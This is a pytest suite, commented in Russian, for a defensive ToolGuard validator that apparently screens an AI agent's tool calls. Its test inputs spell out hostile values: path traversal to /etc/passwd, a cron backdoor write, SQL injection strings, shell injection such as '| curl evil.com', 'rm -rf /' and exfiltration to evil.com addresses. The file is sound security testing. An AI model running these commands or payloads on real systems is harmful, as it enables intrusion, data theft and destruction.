"""
test_policy_tool_guard.py
=========================
Полный набор pytest-тестов ToolGuard.

Структура:
    TestToolGuardAllowlist        — проверка allowlist
    TestToolGuardSchemaReadFile   — схема read_file
    TestToolGuardSchemaWriteFile  — схема write_file
    TestToolGuardSchemaGetDb      — схема get_db_record
    TestToolGuardSchemaRestApi    — схема call_rest_api
    TestToolGuardSchemaExecCmd    — схема execute_command
    TestToolGuardSchemaSendEmail  — схема send_email
    TestToolGuardPrivilege        — уровни привилегий
    TestToolGuardRegistration     — регистрация новых инструментов
    TestToolGuardLegitimate       — легитимные вызовы (FPR)

Запуск:
    pytest test_policy_tool_guard.py -v
"""
import pytest

from .tool_guard import (
    ToolGuard,
    ToolSpec,
    GuardResult,
    PrivilegeLevel,
    DEFAULT_REGISTRY,
)

@pytest.fixture
def tg():
    return ToolGuard()


@pytest.fixture
def tg_medium():
    """ToolGuard с ограничением до MEDIUM."""
    return ToolGuard(max_privilege_level=PrivilegeLevel.MEDIUM)


@pytest.fixture
def tg_low():
    """ToolGuard с ограничением до LOW."""
    return ToolGuard(max_privilege_level=PrivilegeLevel.LOW)


class TestToolGuardAllowlist:

    def test_registered_tool_passes_allowlist(self, tg):
        """Зарегистрированный инструмент проходит allowlist."""
        result = tg.check("read_file", {"path": "report.txt"})
        assert result.rule != "allowlist"

    def test_unknown_tool_blocked(self, tg):
        """Незарегистрированный инструмент блокируется."""
        result = tg.check("hack_system", {})
        assert not result.allowed
        assert result.rule == "allowlist"

    def test_unknown_tool_empty_string(self, tg):
        """Пустое имя инструмента блокируется."""
        result = tg.check("", {})
        assert not result.allowed
        assert result.rule == "allowlist"

    def test_unknown_tool_case_sensitive(self, tg):
        """Имя инструмента проверяется в lowercase."""
        # read_file в uppercase не должен проходить
        result = tg.check("READ_FILE", {"path": "file.txt"})
        # Зависит от реализации: check() делает .lower()
        # По реализации tool_name.lower() — значит должен пройти
        assert result.rule != "allowlist"

    def test_get_allowlist_returns_set(self, tg):
        """get_allowlist() возвращает множество строк."""
        allowlist = tg.get_allowlist()
        assert isinstance(allowlist, set)
        assert "read_file" in allowlist
        assert "execute_command" in allowlist

    def test_all_default_tools_in_allowlist(self, tg):
        """Все инструменты DEFAULT_REGISTRY есть в allowlist."""
        allowlist = tg.get_allowlist()
        for tool_name in DEFAULT_REGISTRY:
            assert tool_name in allowlist

    def test_details_list_available_tools(self, tg):
        """При блокировке по allowlist details содержат список доступных."""
        result = tg.check("unknown_tool", {})
        assert any("read_file" in d for d in result.details)

    def test_result_is_guard_result(self, tg):
        """check() возвращает GuardResult."""
        result = tg.check("read_file", {"path": "f.txt"})
        assert isinstance(result, GuardResult)


# ══════════════════════════════════════════════════════════════════════════════
# ToolGuard — Схема read_file
# ══════════════════════════════════════════════════════════════════════════════

class TestToolGuardSchemaReadFile:

    def test_valid_path_allowed(self, tg):
        """Корректный путь разрешён."""
        assert tg.check("read_file", {"path": "report.txt"}).allowed

    def test_nested_path_allowed(self, tg):
        """Вложенный путь разрешён."""
        assert tg.check("read_file", {"path": "reports/2024/q3.txt"}).allowed

    def test_path_traversal_blocked(self, tg):
        """Path traversal ../ блокируется."""
        result = tg.check("read_file", {"path": "../../etc/passwd"})
        assert not result.allowed
        assert result.rule == "schema"

    def test_path_with_null_byte_blocked(self, tg):
        """Путь с нулевым байтом блокируется."""
        result = tg.check("read_file", {"path": "file.txt\x00.jpg"})
        assert not result.allowed

    def test_empty_path_blocked(self, tg):
        """Пустой путь блокируется (min_length=1)."""
        result = tg.check("read_file", {"path": ""})
        assert not result.allowed
        assert result.rule == "schema"

    def test_missing_path_blocked(self, tg):
        """Отсутствующий аргумент path блокируется."""
        result = tg.check("read_file", {})
        assert not result.allowed
        assert result.rule == "schema"

    def test_path_too_long_blocked(self, tg):
        """Путь длиннее 512 символов блокируется."""
        result = tg.check("read_file", {"path": "a" * 513})
        assert not result.allowed

    def test_details_contain_error_info(self, tg):
        """details содержат информацию об ошибке валидации."""
        result = tg.check("read_file", {"path": "../../evil"})
        assert len(result.details) > 0


# ══════════════════════════════════════════════════════════════════════════════
# ToolGuard — Схема write_file
# ══════════════════════════════════════════════════════════════════════════════

class TestToolGuardSchemaWriteFile:

    def test_valid_write_allowed(self, tg):
        """Корректная запись в разрешённый путь."""
        result = tg.check("write_file", {"path": "output/result.txt", "content": "OK"})
        assert result.allowed

    def test_write_etc_blocked(self, tg):
        """/etc/ — запрещённая директория для записи."""
        result = tg.check("write_file", {"path": "/etc/cron.d/backdoor", "content": "evil"})
        assert not result.allowed
        assert result.rule == "schema"

    def test_write_proc_blocked(self, tg):
        """/proc/ — запрещённая директория для записи."""
        result = tg.check("write_file", {"path": "/proc/1/mem", "content": "x"})
        assert not result.allowed

    def test_write_root_blocked(self, tg):
        """/root/ — запрещённая директория для записи."""
        result = tg.check("write_file", {"path": "/root/.bashrc", "content": "evil"})
        assert not result.allowed

    def test_write_traversal_blocked(self, tg):
        """Path traversal при записи блокируется."""
        result = tg.check("write_file", {"path": "../../etc/passwd", "content": "x"})
        assert not result.allowed

    def test_missing_content_blocked(self, tg):
        """Отсутствие аргумента content блокируется."""
        result = tg.check("write_file", {"path": "file.txt"})
        assert not result.allowed

    def test_content_too_long_blocked(self, tg):
        """Слишком длинный content (> 10000 символов) блокируется."""
        result = tg.check("write_file", {"path": "f.txt", "content": "x" * 10_001})
        assert not result.allowed


# ══════════════════════════════════════════════════════════════════════════════
# ToolGuard — Схема get_db_record
# ══════════════════════════════════════════════════════════════════════════════

class TestToolGuardSchemaGetDb:

    def test_valid_query_allowed(self, tg):
        """Корректный запрос к БД разрешён."""
        result = tg.check("get_db_record", {"table": "users", "id": 42})
        assert result.allowed

    def test_valid_query_with_limit(self, tg):
        """Запрос с допустимым limit разрешён."""
        result = tg.check("get_db_record", {"table": "orders", "limit": 100})
        assert result.allowed

    def test_sql_injection_drop_blocked(self, tg):
        """SQL-инъекция DROP в filter блокируется."""
        result = tg.check("get_db_record", {
            "table": "users",
            "filter": "1=1; DROP TABLE users --"
        })
        assert not result.allowed

    def test_sql_injection_union_blocked(self, tg):
        """UNION в filter блокируется."""
        result = tg.check("get_db_record", {
            "table": "users",
            "filter": "1 UNION SELECT password FROM admins"
        })
        assert not result.allowed

    def test_invalid_table_name_blocked(self, tg):
        """Таблица с недопустимыми символами блокируется."""
        result = tg.check("get_db_record", {"table": "users; DROP TABLE users"})
        assert not result.allowed

    def test_limit_too_large_blocked(self, tg):
        """limit > 500 блокируется."""
        result = tg.check("get_db_record", {"table": "users", "limit": 501})
        assert not result.allowed

    def test_limit_zero_blocked(self, tg):
        """limit = 0 блокируется (ge=1)."""
        result = tg.check("get_db_record", {"table": "users", "limit": 0})
        assert not result.allowed

    def test_negative_id_blocked(self, tg):
        """Отрицательный id блокируется."""
        result = tg.check("get_db_record", {"table": "users", "id": -1})
        assert not result.allowed


# ══════════════════════════════════════════════════════════════════════════════
# ToolGuard — Схема call_rest_api
# ══════════════════════════════════════════════════════════════════════════════

class TestToolGuardSchemaRestApi:

    def test_trusted_internal_url_allowed(self, tg):
        """Доверенный внутренний URL разрешён."""
        result = tg.check("call_rest_api", {
            "url": "https://trusted.corp.internal/api/status",
            "method": "GET"
        })
        assert result.allowed

    def test_localhost_allowed(self, tg):
        """localhost разрешён."""
        result = tg.check("call_rest_api", {"url": "http://localhost:8080/health"})
        assert result.allowed

    def test_private_ip_allowed(self, tg):
        """Приватный IP 10.x.x.x разрешён."""
        result = tg.check("call_rest_api", {"url": "http://10.0.0.1/api"})
        assert result.allowed

    def test_external_url_blocked(self, tg):
        """Внешний URL блокируется схемой."""
        result = tg.check("call_rest_api", {"url": "https://evil.com/steal"})
        assert not result.allowed
        assert result.rule == "schema"

    def test_invalid_method_blocked(self, tg):
        """Недопустимый HTTP-метод блокируется."""
        result = tg.check("call_rest_api", {
            "url": "http://localhost/api",
            "method": "HACK"
        })
        assert not result.allowed

    def test_delete_method_allowed(self, tg):
        """DELETE — допустимый метод."""
        result = tg.check("call_rest_api", {
            "url": "http://localhost/api/resource/1",
            "method": "DELETE"
        })
        assert result.allowed

    @pytest.mark.parametrize("method", ["GET", "POST", "PUT", "PATCH", "DELETE"])
    def test_all_valid_methods_allowed(self, tg, method):
        """Все стандартные HTTP-методы разрешены."""
        result = tg.check("call_rest_api", {
            "url": "http://localhost/api",
            "method": method
        })
        assert result.allowed


# ══════════════════════════════════════════════════════════════════════════════
# ToolGuard — Схема execute_command
# ══════════════════════════════════════════════════════════════════════════════

class TestToolGuardSchemaExecCmd:

    @pytest.mark.parametrize("cmd", ["ls", "pwd", "whoami", "date", "uptime", "df"])
    def test_safe_commands_allowed(self, tg, cmd):
        """Все разрешённые команды проходят проверку."""
        result = tg.check("execute_command", {"command": cmd})
        assert result.allowed, f"Команда {cmd!r} должна быть разрешена"

    def test_rm_rf_blocked(self, tg):
        """rm -rf блокируется."""
        result = tg.check("execute_command", {"command": "rm", "args": ["-rf", "/"]})
        assert not result.allowed

    def test_cat_etc_passwd_blocked(self, tg):
        """cat заблокирована (не в allowlist)."""
        result = tg.check("execute_command", {"command": "cat"})
        assert not result.allowed

    def test_shell_injection_in_args_blocked(self, tg):
        """Shell-инъекция ; в аргументах блокируется."""
        result = tg.check("execute_command", {
            "command": "ls",
            "args": ["; cat /etc/passwd"]
        })
        assert not result.allowed

    def test_pipe_in_args_blocked(self, tg):
        """Pipe | в аргументах блокируется."""
        result = tg.check("execute_command", {
            "command": "ls",
            "args": ["| curl evil.com"]
        })
        assert not result.allowed

    def test_backtick_in_args_blocked(self, tg):
        """Backtick ` в аргументах блокируется."""
        result = tg.check("execute_command", {
            "command": "ls",
            "args": ["`whoami`"]
        })
        assert not result.allowed

    def test_too_many_args_blocked(self, tg):
        """Более 5 аргументов блокируется."""
        result = tg.check("execute_command", {
            "command": "ls",
            "args": ["a", "b", "c", "d", "e", "f"]
        })
        assert not result.allowed

    def test_clean_args_allowed(self, tg):
        """Корректные аргументы разрешены."""
        result = tg.check("execute_command", {
            "command": "ls",
            "args": ["-la"]
        })
        assert result.allowed


# ══════════════════════════════════════════════════════════════════════════════
# ToolGuard — Схема send_email
# ══════════════════════════════════════════════════════════════════════════════

class TestToolGuardSchemaSendEmail:

    def test_internal_email_allowed(self, tg):
        """Корпоративный email разрешён."""
        result = tg.check("send_email", {
            "to":      "admin@corp.internal",
            "subject": "Отчёт за квартал",
            "body":    "Прикладываю отчёт."
        })
        assert result.allowed

    def test_second_internal_domain_allowed(self, tg):
        """Второй разрешённый домен company.ru разрешён."""
        result = tg.check("send_email", {
            "to":      "user@company.ru",
            "subject": "Test",
            "body":    "Hello"
        })
        assert result.allowed

    def test_external_email_blocked(self, tg):
        """Внешний email блокируется."""
        result = tg.check("send_email", {
            "to":      "attacker@evil.com",
            "subject": "Leaked data",
            "body":    "Here is your data"
        })
        assert not result.allowed
        assert result.rule == "schema"

    def test_gmail_blocked(self, tg):
        """Gmail-адрес блокируется."""
        result = tg.check("send_email", {
            "to":      "user@gmail.com",
            "subject": "Test",
            "body":    "Hi"
        })
        assert not result.allowed

    def test_invalid_email_format_blocked(self, tg):
        """Некорректный формат email блокируется."""
        result = tg.check("send_email", {
            "to":      "not-an-email",
            "subject": "Test",
            "body":    "Hi"
        })
        assert not result.allowed

    def test_empty_subject_blocked(self, tg):
        """Пустая тема блокируется."""
        result = tg.check("send_email", {
            "to":      "admin@corp.internal",
            "subject": "",
            "body":    "Hello"
        })
        assert not result.allowed

    def test_body_too_long_blocked(self, tg):
        """Тело письма > 5000 символов блокируется."""
        result = tg.check("send_email", {
            "to":      "admin@corp.internal",
            "subject": "Test",
            "body":    "x" * 5_001
        })
        assert not result.allowed


# ══════════════════════════════════════════════════════════════════════════════
# ToolGuard — Уровни привилегий
# ══════════════════════════════════════════════════════════════════════════════

class TestToolGuardPrivilege:

    def test_low_privilege_tool_allowed_at_low(self, tg_low):
        """Инструмент LOW разрешён при max_privilege=LOW."""
        result = tg_low.check("read_file", {"path": "file.txt"})
        assert result.allowed

    def test_medium_tool_blocked_at_low(self, tg_low):
        """Инструмент MEDIUM блокируется при max_privilege=LOW."""
        result = tg_low.check("write_file", {"path": "f.txt", "content": "x"})
        assert not result.allowed
        assert result.rule == "privilege"

    def test_high_tool_blocked_at_medium(self, tg_medium):
        """Инструмент HIGH блокируется при max_privilege=MEDIUM."""
        result = tg_medium.check(
            "call_rest_api",
            {"url": "http://localhost/api"}
        )
        assert not result.allowed
        assert result.rule == "privilege"

    def test_critical_tool_blocked_at_medium(self, tg_medium):
        """Инструмент CRITICAL блокируется при max_privilege=MEDIUM."""
        result = tg_medium.check("execute_command", {"command": "ls"})
        assert not result.allowed
        assert result.rule == "privilege"

    def test_critical_tool_allowed_at_critical(self, tg):
        """Инструмент CRITICAL разрешён при max_privilege=CRITICAL."""
        result = tg.check("execute_command", {"command": "ls"})
        assert result.allowed

    def test_privilege_error_message_contains_levels(self, tg_medium):
        """Сообщение об ошибке содержит уровни привилегий."""
        result = tg_medium.check("execute_command", {"command": "ls"})
        assert "CRITICAL" in result.reason
        assert "MEDIUM" in result.reason

    def test_privilege_enum_ordering(self):
        """Уровни привилегий корректно упорядочены."""
        assert PrivilegeLevel.LOW < PrivilegeLevel.MEDIUM
        assert PrivilegeLevel.MEDIUM < PrivilegeLevel.HIGH
        assert PrivilegeLevel.HIGH < PrivilegeLevel.CRITICAL

    def test_privilege_check_before_schema(self, tg_low):
        """
        Проверка привилегий выполняется ПОСЛЕ схемы.
        Если схема не прошла — возвращается schema, а не privilege.
        """
        # write_file с плохими аргументами + privilege MEDIUM > LOW
        result = tg_low.check("write_file", {"path": "/etc/passwd", "content": "x"})
        # Должна сработать схема (path в /etc запрещён)
        assert result.rule == "schema"


# ══════════════════════════════════════════════════════════════════════════════
# ToolGuard — Регистрация инструментов
# ══════════════════════════════════════════════════════════════════════════════

class TestToolGuardRegistration:

    def test_register_new_tool(self, tg):
        """Новый инструмент регистрируется и проходит allowlist."""
        from pydantic import BaseModel

        class MyArgs(BaseModel):
            data: str

        tg.register_tool(ToolSpec(
            name="my_tool",
            privilege_level=PrivilegeLevel.LOW,
            schema=MyArgs,
        ))
        result = tg.check("my_tool", {"data": "hello"})
        assert result.allowed

    def test_registered_tool_in_allowlist(self, tg):
        """Зарегистрированный инструмент появляется в allowlist."""
        tg.register_tool(ToolSpec(
            name="new_tool",
            privilege_level=PrivilegeLevel.LOW,
            schema=None,
        ))
        assert "new_tool" in tg.get_allowlist()

    def test_extra_tools_via_constructor(self):
        """extra_tools в конструкторе расширяют реестр."""
        extra = {"special_tool": ToolSpec(
            name="special_tool",
            privilege_level=PrivilegeLevel.LOW,
            schema=None,
        )}
        tg = ToolGuard(extra_tools=extra)
        assert "special_tool" in tg.get_allowlist()

    def test_tool_without_schema_allowed(self):
        """Инструмент без Pydantic-схемы пропускает проверку аргументов."""
        tg = ToolGuard(extra_tools={"no_schema": ToolSpec(
            name="no_schema",
            privilege_level=PrivilegeLevel.LOW,
            schema=None,
        )})
        result = tg.check("no_schema", {"any": "args", "here": 123})
        assert result.allowed


# ══════════════════════════════════════════════════════════════════════════════
# ToolGuard — Легитимные вызовы (FPR)
# ══════════════════════════════════════════════════════════════════════════════

class TestToolGuardLegitimate:

    LEGIT_CALLS = [
        ("read_file",      {"path": "report.txt"}),
        ("read_file",      {"path": "data/2024/q3.csv"}),
        ("write_file",     {"path": "output/result.txt", "content": "OK"}),
        ("write_file",     {"path": "logs/app.log",     "content": "INFO started"}),
        ("get_db_record",  {"table": "users",  "id": 1}),
        ("get_db_record",  {"table": "orders", "limit": 50}),
        ("get_db_record",  {"table": "products", "filter": "active=true"}),
        ("call_rest_api",  {"url": "http://localhost:8080/health"}),
        ("call_rest_api",  {"url": "https://trusted.corp.internal/api/v1/status"}),
        ("call_rest_api",  {"url": "http://10.0.0.5/metrics", "method": "GET"}),
        ("execute_command", {"command": "ls",     "args": ["-la"]}),
        ("execute_command", {"command": "whoami", "args": []}),
        ("execute_command", {"command": "df",     "args": ["-h"]}),
        ("send_email",     {"to": "admin@corp.internal",
                            "subject": "Report", "body": "See attached"}),
        ("send_email",     {"to": "team@company.ru",
                            "subject": "Update", "body": "FYI"}),
    ]

    @pytest.mark.parametrize("tool,args", LEGIT_CALLS)
    def test_legitimate_call_allowed(self, tg, tool, args):
        """Легитимный вызов инструмента должен быть разрешён."""
        result = tg.check(tool, args)
        assert result.allowed, (
            f"Ложное срабатывание: {tool}({args})\n"
            f"rule={result.rule}, reason={result.reason}\n"
            f"details={result.details}"
        )

    def test_fpr_below_10_percent(self, tg):
        """FPR по легитимным вызовам не превышает 10%."""
        blocked = sum(
            1 for tool, args in self.LEGIT_CALLS
            if not tg.check(tool, args).allowed
        )
        fpr = blocked / len(self.LEGIT_CALLS)
        assert fpr <= 0.10, f"FPR = {fpr:.1%} превышает 10%"
